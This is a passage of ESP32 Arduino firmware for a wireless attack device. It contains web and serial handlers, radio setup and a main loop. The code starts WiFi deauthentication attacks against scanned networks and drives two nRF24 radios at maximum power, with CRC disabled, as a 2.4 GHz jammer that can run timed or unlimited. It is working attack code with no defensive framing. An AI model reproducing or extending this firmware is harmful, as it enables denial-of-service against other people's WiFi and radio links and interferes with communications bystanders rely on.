void handleScan() {
  if (isJamming) stopJamming();
  startWiFiScan();
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "Scanning...");
}

void handleDeauth() {
  String idxStr = server.arg("idx"); 
  if (idxStr == "stop") stopDeauth();
  else {
    int idx = idxStr.toInt();
    if (isJamming) { stopJamming(); isJamming = false; }
    startDeauth(idx);
  }
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "Redirecting...");
}

void handleRFToggle() {
  String timeStr = server.arg("time");
  int seconds = timeStr.toInt();
  
  if (seconds >= 0) {
    if (isDeauthing) stopDeauth();
    isJamming = true;
    startJamming();

    if (seconds > 0) {
      isWebRfJamming = true;
      currentWebJamDuration = seconds * 1000; 
      rfJamStartTime = millis();
    } else {
      isWebRfJamming = false; 
      Serial.println("[*] Unlimited Web Jammer Started. Press GPIO 4 to stop.");
    }
  }
  server.send(200, "text/plain", "OK");
}

// ================= SERIAL COMMAND HANDLER =================
void handleSerial() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n'); command.trim();
    if (command.equalsIgnoreCase("help")) Serial.println("Commands: scan, deauth X, deauth off, rf, rf off");
    else if (command.equalsIgnoreCase("scan")) { if(isJamming) stopJamming(); startWiFiScan(); }
    else if (command.startsWith("deauth ")) {
      String arg = command.substring(7); arg.trim();
      if (arg == "off") stopDeauth();
      else { if(isJamming) stopJamming(); startDeauth(arg.toInt()); }
    }
    else if (command.equalsIgnoreCase("rf")) { toggleJammerPhysical(); }
    else if (command.equalsIgnoreCase("rf off")) { if(isJamming) { isJamming=false; stopJamming(); } }
  }
}

void initSP() {
  sp = new SPIClass(VSPI); sp->begin(18, 19, 23, 21); 
  radio1.begin(sp); radio1.setAutoAck(false); radio1.stopListening(); radio1.setPALevel(RF24_PA_MAX, true); radio1.setDataRate(RF24_2MBPS); radio1.setCRCLength(RF24_CRC_DISABLED);
}
void initHP() {
  hp = new SPIClass(HSPI); hp->begin(14, 12, 13, 15); 
  radio.begin(hp); radio.setAutoAck(false); radio.stopListening(); radio.setPALevel(RF24_PA_MAX, true); radio.setDataRate(RF24_2MBPS); radio.setCRCLength(RF24_CRC_DISABLED);
}

void setup() {
  Serial.begin(115200); delay(1000); setCpuFrequencyMhz(240);
  pinMode(rfButtonPin, INPUT_PULLUP); pinMode(rfLedPin, OUTPUT); digitalWrite(rfLedPin, LOW);
  pinMode(deauthButtonPin, INPUT_PULLUP); pinMode(deauthLedPin, OUTPUT); digitalWrite(deauthLedPin, LOW);

  initHP(); initSP(); radio.powerDown(); radio1.powerDown();
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(apSSID, apPassword);
  Serial.print("Connect to: "); Serial.println(apSSID);
  Serial.print("IP: "); Serial.println(WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deauth", handleDeauth); 
  server.on("/rf", handleRFToggle);
  server.begin();
}

void loop() {
  server.handleClient(); 
  checkJammerButton(); checkDeauthButton(); handleSerial();

  if (isWebRfJamming && (millis() - rfJamStartTime >= currentWebJamDuration)) {
    Serial.println("[*] Web RF Jammer Auto-OFF. Reconnecting WiFi...");
    isJamming = false;
    stopJamming();
  }

  if (isJamming) aggressiveRandomMode();
  if (isDeauthing) { sendDeauth(); delay(20); }
  yield(); 
}
